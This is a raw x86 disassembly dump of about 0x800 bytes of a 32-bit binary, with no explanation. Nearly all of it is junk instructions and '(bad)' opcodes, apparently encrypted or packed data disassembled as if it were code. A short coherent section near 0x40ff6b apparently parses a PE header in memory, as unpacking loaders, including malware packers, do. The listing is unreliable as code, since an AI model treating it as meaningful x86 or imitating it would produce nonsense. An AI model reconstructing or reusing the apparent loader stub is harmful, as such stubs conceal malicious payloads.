  40f90b:	mov    edi,0x8d924961
  40f910:	mov    edi,0x6f5eda5c
  40f915:	repnz shl BYTE PTR [ecx],cl
  40f918:	es cld 
  40f91a:	int    0xb3
  40f91c:	pop    esp
  40f91d:	mov    esi,0x9e6fd410
  40f922:	pop    esi
  40f923:	mov    esp,0x3fb8ec55
  40f928:	mov    eax,0xd0315c4d
  40f92d:	push   0x7be037b9
  40f932:	ins    DWORD PTR es:[edi],dx
  40f933:	mov    ebp,0x7a3d0038
  40f938:	daa    
  40f939:	sbb    ebp,DWORD PTR [ebx-0x4751b98b]
  40f93f:	or     eax,0xc8c9cd8d
  40f944:	out    dx,eax
  40f945:	stos   DWORD PTR es:[edi],eax
  40f946:	and    al,0x8c
  40f948:	xor    dh,dh
  40f94a:	xor    al,0x42
  40f94c:	es ins DWORD PTR es:[edi],dx
  40f94e:	sbb    BYTE PTR [ecx],0x25
  40f951:	fnstsw WORD PTR [edx]
  40f953:	inc    ecx
  40f954:	sbb    ecx,esp
  40f956:	js     0x40f987
  40f958:	jb     0x40f9aa
  40f95a:	mov    ah,0xc1
  40f95c:	inc    esi
  40f95d:	or     eax,0x93e5eb25
  40f962:	arpl   WORD PTR [ecx],bp
  40f964:	mov    ds:0xf77a4789,al
  40f969:	and    ebx,DWORD PTR [ebx]
  40f96b:	xor    al,0xda
  40f96d:	ss int3 
  40f96f:	jecxz  0x40f975
  40f971:	xchg   dh,ch
  40f973:	sbb    ebx,DWORD PTR [edi+0x471d8792]
  40f979:	cmp    BYTE PTR [esi-0x4b],bl
  40f97c:	sbb    bh,BYTE PTR [edi+0x4f]
  40f97f:	sub    BYTE PTR [esi],dh
  40f981:	mov    esi,0xca7310e9
  40f986:	xchg   edx,eax
  40f987:	repnz test eax,0x42d2041d
  40f98d:	and    DWORD PTR [esi-0x4b],esp
  40f990:	enter  0xc14b,0x7f
  40f994:	xlat   BYTE PTR ds:[ebx]
  40f995:	dec    esi
  40f996:	pop    eax
  40f997:	mov    cl,0xad
  40f999:	xchg   esp,eax
  40f99a:	mov    edx,0x10d2f212
  40f99f:	mov    eax,0x33e04004
  40f9a4:	or     eax,0x3bcf43fb
  40f9a9:	xor    al,0xb6
  40f9ab:	or     al,0x49
  40f9ad:	xchg   ebp,eax
  40f9ae:	adc    al,0xfa
  40f9b0:	jne    0x40f9ce
  40f9b2:	nop
  40f9b3:	pop    ebp
  40f9b4:	mov    dl,0x61
  40f9b6:	push   ecx
  40f9b7:	cmp    eax,0x84daa903
  40f9bc:	lds    ebx,FWORD PTR [ebp-0x50]
  40f9bf:	in     eax,dx
  40f9c0:	fwait
  40f9c1:	repz bound ebp,QWORD PTR [ebp-0x28c6d80c]
  40f9c8:	jb     0x40f9a6
  40f9ca:	xor    BYTE PTR [eax+edx*2],al
  40f9cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9ce:	xchg   ebp,eax
  40f9cf:	rol    BYTE PTR [ebx-0x9],1
  40f9d2:	push   eax
  40f9d3:	ins    BYTE PTR es:[edi],dx
  40f9d4:	in     al,dx
  40f9d5:	jmp    0xa293:0x44baf44a
  40f9dc:	daa    
  40f9dd:	mov    ebx,esp
  40f9df:	sti    
  40f9e0:	push   edi
  40f9e1:	and    al,0x15
  40f9e3:	cmp    ah,bh
  40f9e5:	mov    edx,0x58b0d52e
  40f9ea:	xchg   esp,eax
  40f9eb:	cmc    
  40f9ec:	bound  ebx,QWORD PTR [ebx+0x61e237de]
  40f9f2:	xchg   ecx,eax
  40f9f3:	fwait
  40f9f4:	xor    DWORD PTR [esi],eax
  40f9f6:	adc    dh,BYTE PTR [ebp+ecx*1+0x1f]
  40f9fa:	xor    edi,DWORD PTR [edi-0x74]
  40f9fd:	add    BYTE PTR [ebx-0x5e],bh
  40fa00:	inc    eax
  40fa01:	(bad)  
  40fa02:	pusha  
  40fa03:	dec    ecx
  40fa04:	add    bh,BYTE PTR [ebp*2-0x161415df]
  40fa0b:	int3   
  40fa0c:	les    ebx,FWORD PTR [ecx]
  40fa0e:	dec    ebx
  40fa0f:	repnz (bad) 
  40fa11:	into   
  40fa12:	enter  0x3858,0x8c
  40fa16:	dec    ebx
  40fa17:	test   DWORD PTR [edx-0x32],esi
  40fa1a:	sti    
  40fa1b:	bound  ebx,QWORD PTR [esi]
  40fa1d:	pop    ebp
  40fa1e:	cs daa 
  40fa20:	inc    ebx
  40fa21:	dec    esp
  40fa22:	(bad)  
  40fa23:	aas    
  40fa24:	ins    BYTE PTR es:[edi],dx
  40fa25:	xchg   ebp,eax
  40fa26:	loop   0x40fa99
  40fa28:	test   dh,dl
  40fa2a:	add    ah,al
  40fa2c:	fstp   TBYTE PTR [esi]
  40fa2e:	mov    bl,0xc8
  40fa30:	ds nop
  40fa32:	std    
  40fa33:	lods   al,BYTE PTR ds:[esi]
  40fa34:	or     eax,0x946e7425
  40fa39:	fld    TBYTE PTR [eax-0x4f]
  40fa3c:	sbb    esp,DWORD PTR [edx-0x24226c92]
  40fa42:	sbb    ebx,DWORD PTR [edi]
  40fa44:	lods   al,BYTE PTR ds:[esi]
  40fa45:	mov    edi,0xa2e945d2
  40fa4a:	(bad)  
  40fa4b:	loope  0x40fa6e
  40fa4d:	ror    DWORD PTR [edi],cl
  40fa4f:	push   es
  40fa50:	xor    bl,BYTE PTR [eax+0x1458bc3f]
  40fa56:	(bad)  
  40fa57:	stc    
  40fa58:	shr    al,0x8b
  40fa5b:	fcomp  DWORD PTR [edi+0x4]
  40fa5e:	mov    edx,0xd0d54977
  40fa63:	pop    edx
  40fa64:	imul   edi,DWORD PTR [eax],0x7e
  40fa67:	jecxz  0x40fa0a
  40fa69:	loope  0x40fa0f
  40fa6b:	jecxz  0x40fae3
  40fa6d:	jnp    0x40fa1e
  40fa6f:	rol    DWORD PTR [edi],0xdd
  40fa72:	push   edi
  40fa73:	dec    esp
  40fa74:	out    0x3d,al
  40fa76:	xor    eax,0x66c9484
  40fa7b:	sub    eax,0x6a236ef2
  40fa80:	call   0x1a4c:0x7fc7413d
  40fa87:	or     ecx,DWORD PTR [edi-0x68]
  40fa8a:	mov    edx,DWORD PTR [ebx]
  40fa8c:	fnstcw WORD PTR [ecx+0x18dcdc0a]
  40fa92:	aad    0x1d
  40fa94:	mov    WORD PTR [eax+esi*4-0x2cf9e64d],fs
  40fa9b:	mov    eax,ds:0xd1cefacd
  40faa0:	xor    DWORD PTR es:[esi-0x48],0xdf54b918
  40faa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40faa9:	mov    edi,0xf6ee70e5
  40faae:	sub    ebx,ebp
  40fab0:	mov    BYTE PTR [ebx-0x508f5f01],ah
  40fab6:	popf   
  40fab7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fab8:	retf   
  40fab9:	jecxz  0x40fb31
  40fabb:	mov    dl,0x90
  40fabd:	retf   
  40fabe:	jo     0x40faa3
  40fac0:	push   esi
  40fac1:	add    BYTE PTR [esi-0x23f5b388],ah
  40fac7:	out    dx,al
  40fac8:	nop
  40fac9:	xchg   edx,eax
  40faca:	dec    ecx
  40facb:	js     0x40fa66
  40facd:	leave  
  40face:	pop    ebx
  40fad0:	popf   
  40fad1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fad2:	pop    ss
  40fad3:	or     al,BYTE PTR [edi-0x3a2ca7d6]
  40fad9:	call   0xfa05:0x8ce1fd2e
  40fae0:	xor    al,0x79
  40fae2:	push   eax
  40fae3:	loopne 0x40fb49
  40fae5:	popf   
  40fae6:	fs inc ecx
  40fae8:	ins    BYTE PTR es:[edi],dx
  40fae9:	test   DWORD PTR [edi+0x2c6d44e4],0x37c7d34d
  40faf3:	pop    eax
  40faf4:	enterw 0x629b,0x1c
  40faf9:	cmp    BYTE PTR [esi+0x5397acb2],0xd2
  40fb00:	pop    edx
  40fb01:	mov    esp,0x873b195
  40fb06:	sub    DWORD PTR [edi-0x2af37b3e],eax
  40fb0c:	fistp  WORD PTR [edx+0x41]
  40fb0f:	mov    ecx,0x4a99cfea
  40fb14:	jae    0x40faf5
  40fb16:	mov    BYTE PTR [edx+0x3f],bh
  40fb19:	pop    esi
  40fb1a:	jbe    0x40faa9
  40fb1c:	hlt    
  40fb1d:	lods   al,BYTE PTR ds:[esi]
  40fb1e:	xor    BYTE PTR [esi+0x1b176910],bh
  40fb24:	outs   dx,BYTE PTR ds:[esi]
  40fb25:	aad    0x9f
  40fb27:	test   eax,0x209fc0e7
  40fb2c:	hlt    
  40fb2d:	lods   eax,DWORD PTR ds:[esi]
  40fb2e:	les    edi,FWORD PTR [ebp-0x76]
  40fb31:	mov    dh,0xbe
  40fb33:	mov    esi,ds
  40fb35:	pop    eax
  40fb36:	push   esi
  40fb37:	xor    dl,dl
  40fb39:	and    eax,0x688febb1
  40fb3e:	es sbb eax,0xc3f9ec65
  40fb44:	xchg   ecx,eax
  40fb45:	(bad)  
  40fb46:	push   ss
  40fb47:	int3   
  40fb48:	retf   
  40fb49:	add    eax,0xd87d732a
  40fb4e:	add    cl,ah
  40fb50:	lods   al,BYTE PTR ds:[esi]
  40fb51:	jo     0x40fb6a
  40fb53:	std    
  40fb54:	jae    0x40fb51
  40fb56:	nop
  40fb57:	sub    BYTE PTR [esi-0x42],0x8f
  40fb5b:	or     DWORD PTR [edx-0x29],ebp
  40fb5e:	pop    edx
  40fb5f:	into   
  40fb60:	fadd   st(5),st
  40fb62:	dec    eax
  40fb63:	dec    eax
  40fb64:	ss xchg edx,eax
  40fb66:	mov    BYTE PTR [esi],cl
  40fb68:	into   
  40fb69:	scas   eax,DWORD PTR es:[edi]
  40fb6a:	fsincos 
  40fb6c:	inc    edx
  40fb6d:	test   DWORD PTR [ecx],ecx
  40fb6f:	xor    eax,0xe7371041
  40fb74:	adc    ebp,ecx
  40fb76:	lods   eax,DWORD PTR ds:[esi]
  40fb77:	addr16 xchg ch,bl
  40fb7a:	cwde   
  40fb7b:	xor    ebx,0xffffffc9
  40fb7e:	or     eax,0xa0d47bd5
  40fb83:	mov    ah,0xd5
  40fb85:	sub    BYTE PTR [ebp+esi*4-0x7c37cf8c],0x57
  40fb8d:	loopne 0x40fb98
  40fb8f:	mov    esp,0x2ea93558
  40fb94:	or     DWORD PTR [edi],ecx
  40fb96:	and    edx,ebx
  40fb98:	mov    al,0x7a
  40fb9a:	push   ecx
  40fb9b:	neg    DWORD PTR ds:0x42e124
  40fba1:	jmp    0x40ff6b
  40fba6:	mov    ebp,ecx
  40fba8:	cli    
  40fba9:	xor    DWORD PTR [edx-0x648a4e8f],edi
  40fbaf:	test   BYTE PTR [ebp-0x51],0xd
  40fbb3:	call   0x7070:0xb182ce6d
  40fbba:	mov    ds:0x1570707d,eax
  40fbbf:	test   eax,0x59f6e6b8
  40fbc4:	(bad)  
  40fbc5:	into   
  40fbc6:	inc    ebp
  40fbc7:	test   eax,0x9a446d7d
  40fbcc:	cmp    esp,esp
  40fbce:	je     0x40fc03
  40fbd0:	test   DWORD PTR ds:0x7e197a3c,ebx
  40fbd6:	push   ecx
  40fbd7:	(bad)  
  40fbd9:	(bad)  
  40fbda:	icebp  
  40fbdb:	or     BYTE PTR [edi+0xdef63a9],dl
  40fbe1:	inc    edx
  40fbe2:	imul   esi,esp,0x7
  40fbe5:	sbb    DWORD PTR [edi],edx
  40fbe7:	sbb    al,0x7d
  40fbe9:	les    esi,FWORD PTR [edi+0x19]
  40fbec:	out    dx,al
  40fbed:	ret    0xf937
  40fbf0:	or     eax,0xab1a2e8
  40fbf5:	fcom   DWORD PTR [ebp+esi*4-0x17]
  40fbf9:	xchg   ecx,eax
  40fbfa:	ds mov dl,0x8e
  40fbfd:	repnz mov ebx,0xb7624a0b
  40fc03:	inc    esi
  40fc04:	mov    al,ds:0x81ada2b3
  40fc09:	lods   al,BYTE PTR ds:[esi]
  40fc0a:	popa   
  40fc0b:	cmp    DWORD PTR [esi*8+0x3d0d88d8],esi
  40fc12:	pop    edx
  40fc13:	or     esp,DWORD PTR [eax]
  40fc15:	xchg   esp,eax
  40fc16:	sbb    eax,0x253f7771
  40fc1b:	call   0xcb4a48ff
  40fc20:	loop   0x40fbb7
  40fc22:	dec    esi
  40fc23:	inc    ecx
  40fc24:	aad    0x74
  40fc26:	cmp    ebx,ebx
  40fc28:	rcr    ebp,cl
  40fc2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc2b:	jmp    0x53ba:0x9923018a
  40fc32:	fs int3 
  40fc34:	sbb    ebx,DWORD PTR gs:[edx-0x6e4a366c]
  40fc3b:	sub    DWORD PTR [ecx-0x555bff68],esp
  40fc41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc42:	jecxz  0x40fbe6
  40fc44:	pop    eax
  40fc45:	hlt    
  40fc46:	push   0xffffffc1
  40fc48:	adc    BYTE PTR [ebx+0x601c32ac],al
  40fc4e:	les    eax,FWORD PTR [ebx+eiz*4+0xd]
  40fc52:	mov    al,0xdb
  40fc54:	jle    0x40fbf2
  40fc56:	fwait
  40fc57:	test   DWORD PTR [esi+0x4b3f696c],esp
  40fc5d:	push   edx
  40fc5e:	repnz cli 
  40fc60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc61:	and    DWORD PTR [esi],esi
  40fc63:	jbe    0x40fc19
  40fc65:	sub    edx,DWORD PTR [edx+0x6e]
  40fc68:	sbb    al,0xd4
  40fc6a:	(bad)  
  40fc6b:	add    dh,ch
  40fc6d:	push   edx
  40fc6e:	fiadd  WORD PTR [ebx+0x98091f]
  40fc74:	sbb    BYTE PTR [ecx],0x4f
  40fc77:	jmp    0x40fcb3
  40fc79:	mov    eax,DWORD PTR [eax-0x25c060fe]
  40fc7f:	mov    edx,0x59f591f8
  40fc84:	cld    
  40fc85:	(bad)  
  40fc86:	and    dl,dl
  40fc88:	dec    ecx
  40fc89:	ret    
  40fc8a:	inc    ebx
  40fc8b:	mov    ds:0xac748534,eax
  40fc90:	stc    
  40fc91:	mov    BYTE PTR [ebx],dh
  40fc93:	imul   ebp,ebp,0x1d716216
  40fc99:	pop    ecx
  40fc9a:	hlt    
  40fc9b:	lock mov ecx,0x9ed2e29c
  40fca1:	ins    DWORD PTR es:[edi],dx
  40fca2:	add    bl,BYTE PTR [esi+0x7543500d]
  40fca8:	xchg   edi,eax
  40fca9:	je     0x40fc4b
  40fcab:	xor    edi,DWORD PTR ds:0xdb9d8f6c
  40fcb1:	iret   
  40fcb2:	and    ebx,DWORD PTR es:[eax-0x69f7c985]
  40fcb9:	and    edx,esp
  40fcbb:	loope  0x40fc7c
  40fcbd:	scas   eax,DWORD PTR es:[edi]
  40fcbe:	pop    esi
  40fcbf:	pusha  
  40fcc0:	fld    DWORD PTR [eax]
  40fcc2:	inc    eax
  40fcc3:	sbb    DWORD PTR [esp+edx*2-0x7a],ecx
  40fcc7:	pop    eax
  40fcc8:	sbb    esi,DWORD PTR [ecx+0x16534769]
  40fcce:	xor    eax,0xc1b25814
  40fcd3:	mov    al,ds:0xc7754d0c
  40fcd8:	dec    esp
  40fcd9:	cld    
  40fcda:	test   al,0x53
  40fcdc:	mov    WORD PTR [eax+0xe],es
  40fcdf:	sub    ebp,DWORD PTR [eax]
  40fce1:	popa   
  40fce2:	lea    esi,[ebp-0x55]
  40fce5:	(bad)  
  40fce7:	rcl    BYTE PTR [ecx],0x6f
  40fcea:	jmp    0xa0e5:0x2ff7465
  40fcf1:	rcr    DWORD PTR [edx-0x1eecf659],cl
  40fcf7:	(bad)  
  40fcf8:	mov    esi,0xbe345c4f
  40fcfd:	je     0x40fd07
  40fcff:	sar    BYTE PTR ds:0xc0ea4488,cl
  40fd05:	imul   edx,esp,0x3df3cd2a
  40fd0b:	out    0x2d,eax
  40fd0d:	fisub  WORD PTR [edx+0x70dd2483]
  40fd13:	int    0x57
  40fd15:	cmp    BYTE PTR [ebp-0x53],bl
  40fd18:	sbb    bh,bh
  40fd1a:	inc    ecx
  40fd1b:	(bad)  
  40fd1c:	in     al,dx
  40fd1d:	call   0xe99a:0x6c9d6104
  40fd24:	sbb    bl,BYTE PTR [ebx+0x44f83eb]
  40fd2a:	fs es gs sbb eax,0xd5867855
  40fd32:	and    BYTE PTR ds:0xcbb65ec2,bh
  40fd38:	add    al,BYTE PTR [ebx+eiz*8]
  40fd3b:	or     al,0xc4
  40fd3d:	out    0xb,eax
  40fd3f:	add    BYTE PTR [esi+0x36e4870a],0xe1
  40fd46:	or     edx,eax
  40fd48:	fistp  QWORD PTR [ebp+0x74]
  40fd4b:	mov    edx,DWORD PTR [edi-0x45cc6ba8]
  40fd51:	push   ds
  40fd52:	mov    WORD PTR [edi],cs
  40fd54:	xchg   ebx,eax
  40fd55:	sbb    DWORD PTR [edi-0x69],esp
  40fd58:	test   DWORD PTR [eax-0x3c138f74],esi
  40fd5e:	jge    0x40fdd8
  40fd60:	pop    ecx
  40fd61:	jns    0x40fddd
  40fd63:	div    BYTE PTR ds:0xaae22930
  40fd69:	pusha  
  40fd6a:	dec    ebp
  40fd6b:	sub    DWORD PTR [eax+0x22],esi
  40fd6e:	sbb    BYTE PTR [edi-0x45],cl
  40fd71:	or     cl,BYTE PTR [esp+eiz*4]
  40fd74:	xchg   esi,eax
  40fd75:	inc    ebp
  40fd76:	mov    esi,0x29db0208
  40fd7b:	jnp    0x40fda6
  40fd7d:	ror    BYTE PTR [esi+edx*4],cl
  40fd80:	lds    ecx,FWORD PTR [esi+0x786561fa]
  40fd86:	out    0xf0,eax
  40fd88:	aas    
  40fd89:	cmp    bl,bl
  40fd8b:	test   BYTE PTR [edi+0x6a],cl
  40fd8e:	add    ah,BYTE PTR [ecx+0x5e]
  40fd91:	pop    esi
  40fd92:	sub    esi,edi
  40fd94:	jge    0x40fd73
  40fd96:	test   DWORD PTR [edx-0x3d],eax
  40fd99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd9a:	adc    BYTE PTR [ecx+0x4c3ca6dd],dl
  40fda0:	jo     0x40fde5
  40fda2:	cmp    BYTE PTR [eax],ch
  40fda4:	xchg   BYTE PTR [bx+si],al
  40fda7:	xor    bl,BYTE PTR [ebx-0x80d323e]
  40fdad:	in     al,dx
  40fdae:	inc    esp
  40fdaf:	test   eax,0xb411caf0
  40fdb4:	scas   al,BYTE PTR es:[edi]
  40fdb5:	push   es
  40fdb6:	adc    eax,DWORD PTR [ebx-0x64]
  40fdb9:	sbb    BYTE PTR [edx-0x71e15689],0xe0
  40fdc0:	scas   eax,DWORD PTR es:[edi]
  40fdc1:	inc    DWORD PTR [ebp-0x26]
  40fdc4:	(bad)
  40fdc7:	cmp    DWORD PTR [edi+0x6ffcde87],0x5c052a9
  40fdd1:	push   0xa91117f
  40fdd6:	xchg   ecx,eax
  40fdd7:	icebp  
  40fdd8:	jmp    FWORD PTR [esi-0x5e4d8b8a]
  40fdde:	mov    eax,ds:0xca4e4d00
  40fde3:	(bad)  [edx+0x6b]
  40fde6:	mov    al,0x4b
  40fde8:	aam    0xa8
  40fdea:	adc    ebp,DWORD PTR [ecx-0x3803f27b]
  40fdf0:	pop    ecx
  40fdf2:	mov    al,0x7e
  40fdf4:	mov    ch,BYTE PTR [ebp+esi*1+0x56d7c83c]
  40fdfb:	sub    BYTE PTR [edi-0x31],cl
  40fdfe:	sbb    DWORD PTR [edi+0x148a517a],edx
  40fe04:	inc    edx
  40fe05:	lods   al,BYTE PTR ds:[esi]
  40fe06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe07:	aam    0xb0
  40fe09:	retf   0x4b29
  40fe0c:	stos   DWORD PTR es:[edi],eax
  40fe0d:	mov    dl,0x5a
  40fe0f:	pop    edx
  40fe10:	jne    0x40fe75
  40fe12:	shl    DWORD PTR [ebp+0x51],cl
  40fe15:	push   esp
  40fe16:	jne    0x40fe01
  40fe18:	dec    ebx
  40fe19:	ficom  WORD PTR [ebx]
  40fe1b:	(bad)  
  40fe1c:	cli    
  40fe1d:	pop    edi
  40fe1e:	inc    ecx
  40fe1f:	shr    DWORD PTR es:[ecx-0x4b],0xaf
  40fe24:	or     al,0xc0
  40fe26:	mov    ebx,0x447fcbf6
  40fe2b:	jl     0x40fde3
  40fe2d:	sub    bh,bh
  40fe2f:	hlt    
  40fe30:	sbb    al,0x92
  40fe32:	cmp    al,0xa8
  40fe34:	mov    DWORD PTR [ebx+esi*2-0x2388ae5f],ebp
  40fe3b:	mov    edi,0x96adb4c6
  40fe40:	push   esi
  40fe41:	mov    ds:0xb97995ec,al
  40fe46:	in     al,0x2d
  40fe48:	push   es
  40fe49:	mov    dh,0x62
  40fe4b:	inc    ebp
  40fe4c:	(bad)  
  40fe4d:	iret   
  40fe4e:	xchg   ebx,eax
  40fe50:	or     eax,0xf94ee3bc
  40fe55:	cld    
  40fe56:	mov    dl,dh
  40fe58:	cmc    
  40fe59:	jl     0x40fe39
  40fe5b:	jne    0x40feba
  40fe5d:	adc    al,0x13
  40fe5f:	mul    DWORD PTR [eax+0x2c85b506]
  40fe65:	sbb    eax,0xa062b7ab
  40fe6a:	xchg   esi,eax
  40fe6b:	std    
  40fe6c:	adc    bh,ah
  40fe6e:	mov    ds:0x49049351,eax
  40fe73:	outs   dx,DWORD PTR ds:[esi]
  40fe74:	mov    al,ds:0xd2538197
  40fe79:	xor    dh,BYTE PTR [edi+0x39]
  40fe7c:	gs iret 
  40fe7e:	int    0x12
  40fe80:	icebp  
  40fe81:	dec    ebp
  40fe82:	aad    0x82
  40fe84:	xlat   BYTE PTR ds:[ebx]
  40fe85:	retf   
  40fe86:	adc    DWORD PTR [edx-0x4c],esp
  40fe89:	(bad)  
  40fe8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe8b:	mov    ch,0xb4
  40fe8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe8e:	sbb    al,0x54
  40fe90:	dec    ecx
  40fe91:	out    0x2c,al
  40fe93:	adc    al,0x20
  40fe95:	mov    cl,0x4d
  40fe97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe98:	jb     0x40feb3
  40fe9a:	add    al,0x22
  40fe9c:	jo     0x40ff13
  40fe9e:	add    eax,0xdce5f355
  40fea3:	push   ss
  40fea4:	mov    edx,DWORD PTR [edi-0x60]
  40fea7:	jae    0x40ff00
  40fea9:	inc    ebx
  40feaa:	mov    dl,0x7
  40feac:	mov    ds:0x746a460c,al
  40feb1:	sbb    eax,0xb72ecde8
  40feb6:	cwde   
  40feb7:	fidivr DWORD PTR [ecx+ebp*8]
  40feba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40febb:	push   ebp
  40febc:	lods   eax,DWORD PTR ds:[esi]
  40febd:	aam    0x6c
  40febf:	mov    eax,0xf2fa93e0
  40fec4:	sub    DWORD PTR [ebp-0x6ac06506],ebx
  40feca:	imul   esi,DWORD PTR [ebx+0x16207141],0x9ec598ef
  40fed4:	and    edi,DWORD PTR [edx]
  40fed6:	mov    edx,0xf422f3e
  40fedb:	fst    DWORD PTR [ebx+0x33]
  40fede:	dec    esi
  40fedf:	test   DWORD PTR [ebx-0x58826c9],ecx
  40fee5:	jp     0x40ff37
  40fee7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fee8:	cwde   
  40fee9:	pop    ebx
  40feea:	addr16 inc ebp
  40feec:	jl     0x40ff63
  40feee:	clc    
  40feef:	in     al,0xb
  40fef1:	mov    esi,0x904ad881
  40fef6:	(bad)  
  40fef7:	mov    eax,0x5ab7cb9c
  40fefc:	aaa    
  40fefd:	lods   eax,DWORD PTR ds:[esi]
  40fefe:	daa    
  40feff:	aam    0x8b
  40ff01:	ss lahf 
  40ff03:	fs mov bl,0xd3
  40ff06:	add    eax,0x96310f01
  40ff0b:	mov    esi,0xc299593f
  40ff10:	repnz lds eax,FWORD PTR [edi]
  40ff13:	xor    ebx,ebx
  40ff15:	or     ecx,esi
  40ff17:	int    0x52
  40ff19:	aad    0x3b
  40ff1b:	mov    esp,0xe17a9b67
  40ff20:	sbb    al,0x72
  40ff22:	ret    
  40ff23:	repz inc ebx
  40ff25:	(bad)  
  40ff26:	jns    0x40ff7f
  40ff28:	and    ebp,edx
  40ff2a:	clc    
  40ff2b:	pop    eax
  40ff2c:	pop    ss
  40ff2d:	loope  0x40ff4e
  40ff2f:	pushf  
  40ff30:	(bad)  
  40ff31:	les    esi,FWORD PTR [ecx]
  40ff33:	xor    al,0xed
  40ff35:	lahf   
  40ff36:	je     0x40ff01
  40ff38:	and    eax,0x147aae6b
  40ff3d:	sub    BYTE PTR [ecx-0x1e],al
  40ff40:	es push ebp
  40ff42:	lds    edi,FWORD PTR [eax+0x76afca96]
  40ff48:	cs push es
  40ff4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff4c:	xlat   BYTE PTR ds:[ebx]
  40ff4d:	out    dx,eax
  40ff4e:	aad    0x1c
  40ff50:	adc    BYTE PTR [ecx+0x10779a20],dh
  40ff56:	ins    BYTE PTR es:[edi],dx
  40ff57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff58:	mov    bh,0xe7
  40ff5a:	mov    dh,0xf2
  40ff5c:	test   edi,edx
  40ff5e:	dec    eax
  40ff5f:	mov    edx,0x7c4d1089
  40ff64:	pop    edx
  40ff65:	sub    edi,esi
  40ff67:	jge    0x40ffa2
  40ff69:	addr16 push esi
  40ff6b:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40ff72:	mov    eax,DWORD PTR [ebp+0x8]
  40ff75:	mov    al,BYTE PTR [eax]
  40ff77:	mov    DWORD PTR ds:0x42e134,0x3a3a
  40ff81:	add    al,0x37
  40ff83:	xor    DWORD PTR ds:0x42e6f7,0x42fd7e
  40ff8d:	xor    al,0x47
  40ff8f:	mov    DWORD PTR ds:0x42fcd1,0x1793
  40ff99:	cmp    al,0xc3
  40ff9b:	jne    0x410b7f
  40ffa1:	mov    eax,DWORD PTR [ebp+0x8]
  40ffa4:	mov    edx,DWORD PTR ds:0x42fd76
  40ffaa:	and    edx,DWORD PTR ds:0x42e6fb
  40ffb0:	mov    DWORD PTR ds:0x42fd76,edx
  40ffb6:	mov    ecx,DWORD PTR [ebp+0x8]
  40ffb9:	mov    DWORD PTR ds:0x42e703,0x1299
  40ffc3:	add    ecx,DWORD PTR [eax+0x3c]
  40ffc6:	mov    edx,0x7510855
  40ffcb:	jmp    0x410395
  40ffd0:	fcmovnbe st,st(4)
  40ffd2:	aam    0xc8
  40ffd4:	repz enter 0xf3db,0x5c
  40ffd9:	push   edx
  40ffda:	jae    0x40fff5
  40ffdc:	adc    BYTE PTR [ebx-0x65],bl
  40ffdf:	fdiv   DWORD PTR ds:0xa37070bd
  40ffe5:	jge    0x410057
  40ffe7:	jo     0x410065
  40ffe9:	das    
  40ffea:	stc    
  40ffeb:	pop    eax
  40ffec:	popa   
  40ffed:	pop    esi
  40ffee:	(bad)  
  40ffef:	jmp    DWORD PTR [ecx+ebp*1-0x71]
  40fff3:	jge    0x40ffc3
  40fff5:	pop    ebx
  40fff6:	div    BYTE PTR [edi+0x450df5db]
  40fffc:	out    0x95,eax
  40fffe:	das    
  40ffff:	xchg   esi,eax
  410000:	retf   
  410001:	and    esi,DWORD PTR [ebx+eiz*1]
  410004:	jo     0x410016
  410006:	sahf   
  410007:	lods   eax,DWORD PTR ds:[esi]
  410008:	dec    esp
  410009:	pop    edi
  41000a:	push   eax
  41000b:	vunpckhps ymm4,ymm5,ymm2
  410010:	shl    DWORD PTR ds:0x729c87d9,0x82
  410017:	and    ecx,edx
  410019:	add    DWORD PTR [ebx+0x3a784d67],0x43
  410020:	mov    dl,0xf0
  410022:	sahf   
  410023:	shl    DWORD PTR [ebp+0x6dfd4245],cl
  410029:	or     ebp,DWORD PTR [ebp+0x15]
  41002c:	loope  0x4100a6
  41002e:	dec    esi
  41002f:	(bad)  
  410031:	in     al,dx
  410032:	pusha  
  410033:	dec    ebp
  410034:	pushf  
  410035:	sbb    DWORD PTR [ecx+0xa06ea5],edi
  41003b:	iret   
  41003c:	popa   
  41003d:	mov    al,ds:0xfd15abb6
  410042:	sti    
  410043:	push   ecx
  410044:	adc    ecx,eax
  410046:	mov    esi,ecx
  410048:	add    BYTE PTR [edi],bh
  41004a:	sub    dl,bl
  41004c:	pop    ebx
  41004d:	xor    edx,DWORD PTR [esi-0x50f85260]
  410053:	and    al,0x3b
  410055:	dec    esi
  410056:	and    eax,0x5b80fa69
  41005b:	pusha  
  41005c:	sbb    BYTE PTR [ecx+edi*8-0x6b],ah
  410060:	inc    ecx
  410061:	(bad)  
  410062:	jns    0x4100b2
  410064:	and    DWORD PTR [esi],esp
  410066:	or     BYTE PTR [esp+edx*1+0x279d251e],dh
  41006d:	xor    ecx,ecx
  41006f:	cwde   
  410070:	push   edx
  410071:	mov    ecx,0xa07679c0
  410076:	pop    ss
  410077:	and    al,dh
  410079:	enter  0x8a04,0x47
  41007d:	or     BYTE PTR [esi],ah
  41007f:	jns    0x4100f4
  410081:	test   DWORD PTR [eax-0x3],ebx
  410084:	les    eax,FWORD PTR [edx+edx*8+0x64]
  410088:	and    al,0xf1
  41008a:	enter  0x2fe1,0xda
  41008e:	loop   0x410067
  410090:	sbb    ch,BYTE PTR [esi-0x6d]
  410093:	xchg   edx,eax
  410094:	push   ecx
  410095:	outs   dx,BYTE PTR es:[esi]
  410097:	les    ebp,FWORD PTR [ecx-0x3c9a8cb7]
  41009d:	ja     0x410118
  41009f:	pop    edi
  4100a0:	fucomi st,st(0)
  4100a2:	inc    edi
  4100a3:	adc    al,0x88
  4100a5:	dec    ebx
  4100a6:	fnsave [edx+0x3d]
